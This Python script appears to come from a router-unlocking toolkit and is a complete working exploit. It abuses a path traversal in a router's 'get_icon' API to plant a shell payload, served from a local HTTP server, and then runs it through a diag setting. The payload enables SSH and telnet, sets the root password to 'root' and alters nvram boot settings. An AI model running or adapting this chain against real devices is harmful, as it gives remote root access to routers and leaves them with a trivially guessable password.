#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import time
import requests
import xmir_base
from gateway import *

web_password = True
if len(sys.argv) > 1 and sys.argv[0].endswith('connect7.py'):
    if sys.argv[1]:
        web_password = sys.argv[1]

try:
    gw = inited_gw
except NameError:
    gw = create_gateway(die_if_sshOk = False, web_login = web_password)

api_get_icon_status = 0
srv_ip_addr = None
srv_port = 8080

with gw.api_request("API/xqsystem/get_icon", stream = True, timeout = 5) as resp:
    srv_ip_addr, _ = resp.raw._connection.sock.getsockname()
    try:
        resp.raise_for_status()
    except:
        raise ExploitNotWorked('Exploit "get_icon" not working!!! (API not founded)')
    for chunk in resp.iter_content(chunk_size = 8192): 
        if chunk.startswith(b'\x89PNG'):
            api_get_icon_status = 1

if api_get_icon_status <= 0:
    raise ExploitNotWorked('Exploit "get_icon" not working!!! (api not founded)')


from http.server import HTTPServer, SimpleHTTPRequestHandler
from http.server import BaseHTTPRequestHandler
from http import HTTPStatus
from http import server as http_server

class XmirHttpServer(HTTPServer):
    timeout = 3
    retcode = 0
    
    def server_bind(self):
        HTTPServer.server_bind(self)
        print(f'SERVER: start and wait request from client...')
        
    def handle_timeout(self):
        print(f"SERVER: Timed out! (timeout = {self.timeout})")
        self.retcode = -1
        
    def __del__(self):
        print(f'SERVER: destroy with retcode = {self.retcode}')

class HttpHandler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    default_request_version = 'HTTP/1.1'

    def __init__(self, *args, **kwargs):
        http_server.BaseHTTPRequestHandler.__init__(self, *args, **kwargs)
        
    def do_GET(self):
        print(f'SERVER: get request = {self.path}')
        if self.server.action_path not in self.path:
            print(f'ERROR: Incorrect request from client!')
            self.server.retcode = -10
            raise RuntimeError(f'Incorrect request from client!')
        body = self.server.resp_body
        body_size = len(body)
        self.send_response(HTTPStatus.OK)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(body_size))
        self.end_headers()
        self.wfile.write(body)
        print(f'SERVER: send response to client (len = {body_size} bytes)')
        self.server.retcode = 1

def wait_req_and_send_resp(path, data, bind_addr = '0.0.0.0', ret_code = None, timeout = 3):
    global srv_port
    srv = XmirHttpServer((bind_addr, srv_port), HttpHandler)
    srv.action_path = path
    srv.resp_body = data.encode('utf-8') if isinstance(data, str) else data
    srv.timeout = 5 + timeout
    srv.handle_request()
    if isinstance(ret_code, list):
        ret_code[0] = srv.retcode
    srv = None


payload_def_num = 22
payload_test_num = 800008
payload_base_num = 990000

payload_name = '/etc/diag_info/stat/firewall/payload.sh'
payload_body = f'''#!/bin/sh
FUNC_NUM=$( uci -q get diag.config.iperf_test_thr )
if [ "$FUNC_NUM" = "{payload_base_num}" ]; then
    uci set diag.config.iperf_test_thr={payload_test_num}
    uci commit diag
fi
'''
payload_func_list = [ 'test' ]

def payload_add_func(func_name, cmd):
    global payload_body
    if func_name in payload_func_list:
        raise RuntimeError('Incorrect func_name')
    payload_func_list.append(func_name)
    func_idx = len(payload_func_list) - 1
    func_num = payload_base_num + func_idx
    payload_body += f'if [ "$FUNC_NUM" = "{func_num}" ]; then \n'
    payload_body += f'uci set diag.config.iperf_test_thr={payload_def_num} ; uci commit diag \n'
    payload_body += f'{cmd} \n'
    payload_body += f'fi \n'

payload_add_func('unlock_ssh', r"""
    sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear
    nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit
    echo -e 'root\nroot' > /tmp/psw.txt ; passwd root < /tmp/psw.txt
    /etc/init.d/dropbear enable
""")
payload_add_func('run_ssh', r"""
    /etc/init.d/dropbear restart
""")
payload_add_func('unlock_telnet', r"""
    bdata set telnet_en=1 ; bdata commit
    /etc/init.d/telnet enable
""")
payload_add_func('run_telnet', r"""
    bdata set telnet_en=1 ; bdata commit
    /etc/init.d/telnet restart
""")
payload_add_func('patch_nvram', r"""
    nvram set uart_en=1; nvram set boot_wait=on; nvram commit
    nvram set bootdelay=3; nvram set bootmenu_delay=5; nvram commit
""")

def install_exploit(api = 'API/xqsystem/get_icon'):
    #######
    # vuln/exploit author: remittor
    # exploit public: https://archive.md/1PWkM
    # discovery date: 2024-12-30
    #######
    global gw, srv_ip_addr, srv_port
    from threading import Thread
    srv_timeout = 3
    ret_code = [ None ]    
    server = Thread(target = wait_req_and_send_resp, args = [ payload_name, payload_body, srv_ip_addr, ret_code, srv_timeout ])
    server.start()
    params = { 'ip': f'{srv_ip_addr}:{srv_port}', 'name': f'/../..{payload_name} dummy' }
    resp = gw.api_request(api, params, stream = True, timeout = 12)
    try:
        resp.raise_for_status()
    except Exception:
        raise ExploitNotWorked(f'Exploit "get_icon" not working!!! Cannot transfer Payload to router!')
    resp_body = b''
    for chunk in resp.iter_content(chunk_size = 8192): 
        resp_body += chunk
    print(f'Readed response size = {len(resp_body)} bytes')
    server.join(timeout = 10)
    if not ret_code[0] or ret_code[0] <= 0:
        raise ExploitNotWorked(f'Exploit "get_icon" not working!!! Cannot transfer payload to router! (ret_code = {ret_code[0]})')

def run_exploit(func_name, timeout = 3):
    if func_name not in payload_func_list:
        if 'set telnet_en=1' in func_name:
            func_name = 'unlock_telnet'
        elif 'telnet restart' in func_name:
            func_name = 'run_telnet'
        else:
            raise ValueError(f'Incorrect command: {func_name}')
    func_num = payload_base_num + payload_func_list.index(func_name)
    gw.set_diag_iperf_test_thr(func_num, timeout = 6)
    try:
        res = gw.api_request("API/xqsystem/upload_log", resp = 'text', timeout = timeout)
        if '"code":1512' not in res:
            print(f'run_exploit: "{func_name}" resp: {res}')
    except requests.exceptions.ReadTimeout:
        print(f'run_exploit: "{func_name}" timed out ({timeout} sec)')
        pass


install_exploit()

run_exploit('test')

iperf_test_thr = gw.get_diag_iperf_test_thr(timeout = 6)
print(f'iperf_test_thr = {iperf_test_thr}')
if str(iperf_test_thr) != str(payload_test_num):
    raise ExploitNotWorked('Exploit "get_icon" not working!!!')

#print(gw.get_init_info())

run_exploit('unlock_ssh', 7)
print('Run SSH server on port 22 ...')
run_exploit('run_ssh', 12)

time.sleep(0.5)

gw.post_connect(run_exploit)